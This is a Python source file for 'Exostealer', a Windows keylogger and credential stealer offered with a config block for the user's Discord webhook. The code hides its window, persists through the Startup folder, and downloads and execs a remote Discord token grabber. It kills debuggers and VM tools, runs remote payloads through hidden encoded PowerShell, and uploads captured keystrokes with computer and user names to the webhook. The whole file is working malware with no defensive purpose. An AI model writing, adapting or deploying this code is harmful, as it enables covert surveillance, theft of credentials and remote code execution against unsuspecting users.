import os
import sys
import json
import httpx
import winreg
import ctypes
import shutil
import psutil
import base64
import random
import asyncio
import sqlite3
import zipfile
import secrets
import requests
import threading
import subprocess

from sys import argv
from PIL import ImageGrab
from win32con import SW_HIDE
from base64 import b64decode
from tempfile import mkdtemp
from re import findall, match
from Crypto.Cipher import AES
from pynput.keyboard import Listener
from win32crypt import CryptUnprotectData
from win32gui import GetForegroundWindow, ShowWindow

window = GetForegroundWindow()
ShowWindow(window , SW_HIDE)

exostealer_config = {
    # Replace this string with your discord webhook
    "webhook": "INSERT YOUR DISCORD WEBHOOK HERE",

    # This will add the logger to startup
    "startup": True,

    # This will run Hazard Token Grabber V2
    # https://github.com/Rdimo/Hazard-Token-Grabber-V2/blob/master/main.py
    "run_hazard_grabber_v2": True,
    "hazard_grabber_config": {
        # DO NOT REPLACE THE WEBHOOK STRING HERE, THIS WILL BE REPLACED AUTOMATICALLY.
        'webhook': 'DO NOT PUT ANYTHING HERE',
        # keep it as it is unless you want to have a custom one
        'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
        # set to False if you don't want it to kill programs such as discord upon running the exe
        'kill_processes': True,
        # DO NOT REPLACE THIS, IT WILL BE SET TO FALSE AUTOMATICALLY.
        'startup': False,
        # if you want the file to hide itself after run
        'hide_self': True,
        # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
        'anti_debug': True,
        # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
        'blackListedPrograms':
        [
            "httpdebuggerui",
            "wireshark",
            "fiddler",
            "regedit",
            "cmd",
            "taskmgr",
            "vboxservice",
            "df5serv",
            "processhacker",
            "vboxtray",
            "vmtoolsd",
            "vmwaretray",
            "ida64",
            "ollydbg",
            "pestudio",
            "vmwareuser",
            "vgauthservice",
            "vmacthlp",
            "x96dbg",
            "vmsrvc",
            "x32dbg",
            "vmusrvc",
            "prl_cc",
            "prl_tools",
            "xenservice",
            "qemu-ga",
            "joeboxcontrol",
            "ksdumperclient",
            "ksdumper",
            "joeboxserver"
        ]
    },

    # This will allow you to run payloads which are not listed in the config
    "run_other_payloads": False,

    # This will allow you to run python payloads which are not listed in the config
    "run_other_python_payloads": False,

    "other_payloads": [
        # Add links to payloads here, if "run_other_payloads" is disabled this will be ignored
        # You can add multiple payloads if required.
        "https://www.websitehostingyourpayload.com/payload.exe"
    ],

    "other_python_payloads": [
        # Add links to payloads here, if "run_other_python_payloads" is disabled this will be ignored
        # You can add multiple payloads if required.
        "https://www.websitehostingyourpayload.com/payload.py"
    ]

}

def fake_exception_handler(a, b, c):
    """
    This hides exceptions caused by third party payloads.
    """

    pass

sys.excepthook = fake_exception_handler

localappdata = os.getenv("LOCALAPPDATA") + "\\"
roaming = os.getenv("APPDATA") + "\\"
webhook = exostealer_config["webhook"]

def addtostartup():
    if exostealer_config["startup"] == True:
        try:
            with open(roaming + "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Exostealer.exe", "wb") as startup:
                startup.write(open(sys.argv[0], "rb").read())
        except:
            pass

def hazard_grabber():
    # This may fail if Hazard Token Grabber is updated and the new version has a different config.
    if exostealer_config["run_hazard_grabber_v2"] == True:
        try:
            exostealer_config["hazard_grabber_config"]["webhook"] = webhook
            exostealer_config["hazard_grabber_config"]["startup"] = False
            hazard_config = str(exostealer_config["hazard_grabber_config"])
            default_hazard_config = b"dkP>RARr?ka%FIAVPj<=S4BcdPftr<NJUabAa`kWXdroSb#fqgWnyS=Z)+gphLhrklL{apARs4qWnyS=Z)+zyAR<>qLP$?fOJ7JuQbi&x3LqdLAR{1aWo2+6X>=fAb0BGSAZc?Tb#82Bb8{ehZ*?GdVQzFFbZ;PNVRmI8VIX65b98TQAa8DE3LqdLASY>VYGq?|X>V>{b#iPcIv^rwbaZfYIxjDBVRtTPX>@3HVs&$6a$|39bY*UIE@N+PFH&S_ZEr6`X>((5a%3$@Zfa#?bZKvHFKuCSbY*fcX>Mv|V{~b6ZZ2wbA}k6ZARr(kAaiAOAarjaMqzAoWguy0AbD?fAY^ZDCv+fpVQzFFX>=fTZy;-FY-}KKa&KpHVQq6Db9G~AAYpSLWNC9_Z*pWHb#QNPAaZqXZfS03AarPDAZ2)E3LqdLASY{SY;0d}a&Kd0b8}^LCpsWha&=`a3LqdLAR{1YW*~WQbs%?PZge1YXk{Q~X>4U6bZ;PXb#5SGbRctdVRCeJa0(zGARs4mbYXIIb#Ny-AXIX7Wh@FHARr(kAZcbGd2e+fcVTXHAarPDAZBT7Wgv8KAZTf1WguyEb7gF1AYo>7WpW^Lb#4kEARr(oXlZ0+Uvp(_W+yrzRC0A?ED9hXARr?kWN&42AZc_bb0A`6b95kdZy<1TWp-t5bRcwSWgu{JZ)b90Z6IcHZ*3rAWod3_AY^4?b!TT~WFTQ~WFTa6VRLk8V_|G;c_4CSWOZX@b0BnRWguf{VQyz-b0BYKAbD?fav*nQVrXw~Yan7}X>MmAW^Z+FWC|c4ARs4UZggp1WMyJ?XD2!!RC0A?ED9hXARr?kbZBXFAZ%%KbRchLAaHVTXL4a}b0BwVY-}K6Wgu&5Y;0v@AZcbGXkmI`a%3Q6Wprg@baNndXkm09VQzUKZ)PBLXk~L{AYpQ4AaZqXZfS03EFgJrbs%G5ZXjV~WFT#Ca%CWCW*~WQbs%?PZgdJDARr(oVr*e!YfNc#bY)~va&KpHVQq6KItm~lARt=`ARr(hARr(hB4~7UaAaj-b!TT~a&>7UED9hXARr(hARr=lX>w(AXkl_|A}k6ZARr(hARr(jW@%((Y-MsHED9hXARr(hARr=gWoKn%X>=ki3LqdLARr(hAR=RJWFjmIARr(hARr(hB6MMMYi(z8A}k6ZARr(hARr(jc4BXMb7gXNX=7y~ED9hXARr(hARr=SW;JtVa&{st3LqdLARr(hAR=&bZ)0V1b7)~>Yh`jGED9hXARr(hARr=kVsChKa$$KQED9hXARr(hARr=kZFFyMY;$BHED9hXARr(hARr=kZFgaEWpr|3c_J(dARr(hARr(hB57n{HZ&qE3LqdLARr(hAR=#UY<Xm2XCf>LARr(hARr(hB5-AMbaiBDZz3!TARr(hARr(hB6e+eVRB`4b7gWOED9hXARr(hARr=kXJK`8Xme$9c4=c}A}k6ZARr(hARr(jc5Pu}bZBgFA}k6ZARr(hARr(jcsVv?VrL>O3LqdLARr(hAR=~cb8>cLA}k6ZARr(hARr(jcr!9&VrL>O3LqdLARr(hAR=~cb#rodV<IdHARr(hARr(hB5-nSUt?n;ED9hXARr(hARr=ea%^98Z*OdKA}k6ZARr(hARr(jcx7&LWpZ|DV`U;N3LqdLARr(hAR=*PZFMbYVInLFARr(hARr(hB5H4CVsCh3Z*FvQZ)_qg3LqdLARr(hAR=pXWOZ$DWpZO|X=QG7A}k6ZARr(hARr(jYjb3EZE$6BA}k6ZARr(hARr(jYHwv?Z+LTMa&~2MA_^cNARt`|3Vi"
            exec(requests.get("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text.replace(base64.b85decode(default_hazard_config).decode(), hazard_config))
        except:
            pass

def run_other_payloads():
    if exostealer_config["run_other_payloads"] == True:
        for payload in exostealer_config["other_payloads"]:
            try:
                powershell_script = """$filename = "FILENAME_HERE"\n$wc = New-Object System.Net.WebClient\n$path = [System.Environment]::GetFolderPath("MyVideos")\n$wc.DownloadFile("URL_HERE", $path + "\\" + $filename)\npowershell.exe -noprofile -executionpolicy bypass -windowstyle hidden .\$filename\nRemove-Item $filename"""
                powershell_script = powershell_script.replace("FILENAME_HERE", secrets.token_hex(5) + ".exe").replace("URL_HERE", payload)
                powershell_script = base64.b64encode(powershell_script.encode("utf8")).decode()
                powershell_script = "powershell -noprofile -executionpolicy bypass -windowstyle hidden -encodedcommand" + powershell_script
                
                os.system(powershell_script)
            except:
                pass
def run_other_python_payloads():
    if exostealer_config["run_other_python_payloads"] == True:
        for payload in exostealer_config["other_python_payloads"]:
            try:
                exec(requests.get(payload).text)
            except:
                pass

threading.Thread(target=addtostartup).start()
threading.Thread(target=hazard_grabber).start()
threading.Thread(target=run_other_payloads).start()
threading.Thread(target=run_other_python_payloads).start()

def check_filename(filename:str):
    try:
        encoded_username = base64.urlsafe_b64encode(os.getenv("USERNAME").encode("utf8")).decode() + "\\"
        encoded_username_2 = encoded_username[::-1][1::2][1:]
        hex_chars = "0123456789abcdef"
        if [i in hex_chars for i in filename[:4]]:
            filename = filename[4:]
            if filename.startswith(encoded_username_2):
                filename = filename[len(encoded_username_2):]
                if filename[0] == str(len(encoded_username))[0]:
                    filename = filename[1:]
                    if len(base64.urlsafe_b64decode(filename.split(".")[0].encode("utf8"))) == 3:
                        filename = filename.split(".")[1]
                        if filename[-1] in hex_chars:
                            filename = filename[:-1]
                            if len(filename)//2+1 >= 3 and len(filename)//2+1 <= 5:
                                return True
        return False
    except:
        return False


def create_keylogger_path():
    encoded_username = base64.urlsafe_b64encode(os.getenv("USERNAME").encode("utf8")).decode() + "\\"
    path = roaming + encoded_username
    if not os.path.exists(path):
        os.makedirs(path)
        file_name = secrets.token_hex(2) + encoded_username[::-1][1::2][1:]
        file_name += str(len(encoded_username))[0] + base64.urlsafe_b64encode(secrets.token_bytes(3)).decode()
        file_name += "." + secrets.token_urlsafe(random.randint(3, 5)) + secrets.token_hex(1)
        with open(path + file_name, "w") as f:
            f.write("")
        for i in range(random.randint(15, 31)):
            junk_file_name = secrets.token_hex(1) + secrets.token_urlsafe(4) + str(random.randint(2, 9))
            junk_file_name += base64.urlsafe_b64encode(secrets.token_bytes(2)).decode() + "."
            junk_file_name += secrets.token_urlsafe(random.randint(5, 7))

            if len(junk_file_name) > 24:
                junk_file_name = junk_file_name[:-1][1:]
            if random.randint(1, 2) == 1 and len(junk_file_name) < 23:
                junk_file_name += secrets.token_urlsafe(1)
            
            if not check_filename(junk_file_name):
                with open(path + junk_file_name, "wb") as f:
                    f.write(secrets.token_bytes(random.randint(10, 100)))
        return path + file_name
    else:
        return "Path already exists"

createpath = create_keylogger_path()

if createpath == "Path already exists":
    encoded_username = base64.urlsafe_b64encode(os.getenv("USERNAME").encode("utf8")).decode() + "\\"
    path = roaming + encoded_username
    for file in os.listdir(path):
        if check_filename(file):
            path += file
else:
    path = createpath

def on_press(key):
    with open(path, "a") as f:
        f.write(str(key))
    with open(path, "r") as f:
        if len(f.read()) > 1500:
            try:
                test = requests.get("https://www.google.com")
                if len(str(test.status_code)) == 3:
                    r = requests.post(webhook, json={
                        "content": f"```ansi\n\x1b[0;2m\x1b[0;37m\x1b[0;45m\x1b[1;37mExostealer Keylogger!\n\n\nLength of file: {str(len(f.read()))} bytes\n\n\nComputer Name: {os.environ['COMPUTERNAME']}\nUsername: {os.environ['USERNAME']}\x1b[0m\x1b[0;37m\x1b[0;45m\x1b[0m\x1b[0;37m\x1b[0m\x1b[0m```"
                    }, files={'upload_file': f})
                    if str(r.status_code).startswith("2"):
                        with open(path, "w") as f:
                            f.write("")
            except:
                pass

def on_release(key):
    pass

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
